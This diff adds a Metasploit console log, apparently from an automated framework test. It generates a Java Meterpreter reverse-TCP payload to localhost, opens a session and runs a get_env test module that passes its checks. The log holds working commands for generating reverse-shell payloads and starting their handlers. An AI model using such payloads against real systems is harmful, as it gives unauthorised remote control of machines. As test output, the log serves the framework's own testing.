@@ -1,0 +1,28 @@
+use java/meterpreter/reverse_tcp
+msf6 post(test/railgun_reverse_lookups) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20231102-2760-3mh02ktxt
+msf6 payload(java/meterpreter/reverse_tcp) > msf6 payload(java/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20231102-2760-3mh02ktxt
+msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20231102-2760-dw9olr.jar -f jar AutoVerifySessionTimeout=30 lport=6009 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20231102-2760-y5wpp4txt spawn=0
+[*] Writing 5259 bytes to D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20231102-2760-dw9olr.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 8
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6009 
+[*] Sending stage (57692 bytes) to 127.0.0.1
+[*] Meterpreter session 9 opened (127.0.0.1:6009 -> 127.0.0.1:50027) at 2023-11-02 16:13:05 +0000
+use test/get_env
+msf6 post(test/get_env) > run session=9 AddEntropy=true Verbose=true
+[*] Running against session 9
+[*] Session type is meterpreter and platform is windows
+[+] should return windows path
+[+] should handle % signs
+[+] should return multiple envs
+[*] Testing complete in 0.04 seconds
+[*] Passed: 3; Failed: 0; Skipped: 0
+[*] Post module execution completed
+sessions -K
+msf6 post(test/get_env) > jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 9 closed.
+msf6 post(test/get_env) > Stopping all jobs...
